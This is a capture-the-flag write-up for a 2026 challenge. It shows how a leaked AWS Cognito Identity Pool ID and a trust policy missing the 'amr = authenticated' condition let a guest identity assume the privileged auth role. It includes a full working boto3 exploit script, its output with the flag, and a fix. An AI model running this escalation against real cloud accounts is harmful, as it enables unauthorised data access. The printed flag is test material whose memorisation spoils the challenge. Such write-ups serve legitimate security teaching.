---
title: "MobileApp Beta Portal"
ctf: "Hackastra 2026 CTF"
date: 2026-05-29
category: misc
difficulty: medium
points: 318
flag_format: "FLAG{...}"
author: "CL4Y"
---

# MobileApp Beta Portal

> A mobile app startup just launched their beta portal. Word on the street is their setup has issues. Can you prove it?
>
> http://beta.challenge.hackastra.tech

## Summary

The beta portal is a static S3 site that leaks an **unauthenticated AWS Cognito Identity Pool** in its page source. The pool hands out temporary credentials for an `unauth` IAM role. The flag lives in a premium S3 bucket reachable only by the `auth` role — but that role's trust policy forgets to require `amr == "authenticated"`, so an unauthenticated identity can mint an OpenID token and `AssumeRoleWithWebIdentity` straight into the privileged role.

## Solution

### Step 1: Find the leaked Cognito config

The landing page embeds an Amplify-style `awsConfig` object in plain JavaScript:

```bash
curl -s http://beta.challenge.hackastra.tech/
```

```js
const awsConfig = {
  aws_project_region: "us-east-1",
  aws_cognito_identity_pool_id: "us-east-1:08d85402-467a-4354-becc-97a9a5c549bd",
  aws_user_files_s3_bucket: "mobileapp-mobile-assets-l9tp4r7x",
};
```

An **Identity Pool** ID (vs. a User Pool) means we can request guest/unauthenticated credentials with no login at all.

### Step 2: Recon with the unauth role

Calling `GetId` + `GetCredentialsForIdentity` (unsigned) yields creds for `mobileapp_cognito_unauth_role`. That role can read the assets bucket, where `config/backend-roles.json` discloses a second, privileged bucket and the auth-role ARN:

```json
{"roles":{
  "authenticated":  {"arn":"arn:aws:iam::680311749636:role/mobileapp_cognito_auth_role",  "storage":"mobileapp-premium-content-l9tp4r7x"},
  "unauthenticated":{"arn":"arn:aws:iam::680311749636:role/mobileapp_cognito_unauth_role","storage":"mobileapp-mobile-assets-l9tp4r7x"}}}
```

The premium bucket and direct `sts:AssumeRole` / `CustomRoleArn` are all denied to the unauth role — so the privilege boundary is the auth role itself.

### Step 3: Escalate to the auth role and grab the flag

The intended bug: the auth role's trust policy validates only the `aud` (identity pool) but **omits the `cognito-identity.amazonaws.com:amr == "authenticated"` condition**. With the Basic/Classic auth flow enabled, we get an OpenID token for our *unauthenticated* identity and assume the auth role via web identity.

One complete script, from leaked config to printed flag:

```python
#!/usr/bin/env python3
# pip install boto3
import boto3, json
from botocore import UNSIGNED
from botocore.config import Config

REGION    = "us-east-1"
POOL      = "us-east-1:08d85402-467a-4354-becc-97a9a5c549bd"   # leaked in page source
AUTH_ROLE = "arn:aws:iam::680311749636:role/mobileapp_cognito_auth_role"
PREMIUM   = "mobileapp-premium-content-l9tp4r7x"

# 1) Anonymous Cognito identity -> unauth, then OpenID token (classic flow)
ci  = boto3.client("cognito-identity", region_name=REGION, config=Config(signature_version=UNSIGNED))
iid = ci.get_id(IdentityPoolId=POOL)["IdentityId"]
tok = ci.get_open_id_token(IdentityId=iid)["Token"]

# 2) Escalate: trust policy lacks the amr=authenticated condition
sts = boto3.client("sts", region_name=REGION, config=Config(signature_version=UNSIGNED))
c = sts.assume_role_with_web_identity(
        RoleArn=AUTH_ROLE, RoleSessionName="pwn-auth", WebIdentityToken=tok
    )["Credentials"]

# 3) Read the premium bucket as the authenticated role
s3 = boto3.client("s3", region_name=REGION,
        aws_access_key_id=c["AccessKeyId"],
        aws_secret_access_key=c["SecretAccessKey"],
        aws_session_token=c["SessionToken"])
for o in s3.list_objects_v2(Bucket=PREMIUM).get("Contents", []):
    body = s3.get_object(Bucket=PREMIUM, Key=o["Key"])["Body"].read().decode("utf-8", "replace")
    print(f"=== {o['Key']} ===\n{body}")
```

Output:

```
=== flag.txt ===
FLAG{d0nt_tru5t_th3_c0gn1t0_4uth_r0l3_w1th0ut_c0nd1t10n}
=== notes.txt ===
Internal: subscription tier metadata pending migration.
=== premium/welcome.txt ===
Welcome to MobileApp Premium.
```

## Root Cause / Fix

A Cognito **authenticated** IAM role must pin its trust policy to both the identity pool (`aud`) and the authentication state:

```json
"Condition": {
  "StringEquals": { "cognito-identity.amazonaws.com:aud": "us-east-1:08d8...549bd" },
  "ForAnyValue:StringLike": { "cognito-identity.amazonaws.com:amr": "authenticated" }
}
```

Without the `amr` condition, guest identities are promoted to the authenticated role — exactly what the flag spells out. Disabling the Classic (Basic) auth flow when unused closes the `GetOpenIdToken` path as well.

## Flag

```
FLAG{d0nt_tru5t_th3_c0gn1t0_4uth_r0l3_w1th0ut_c0nd1t10n}
```
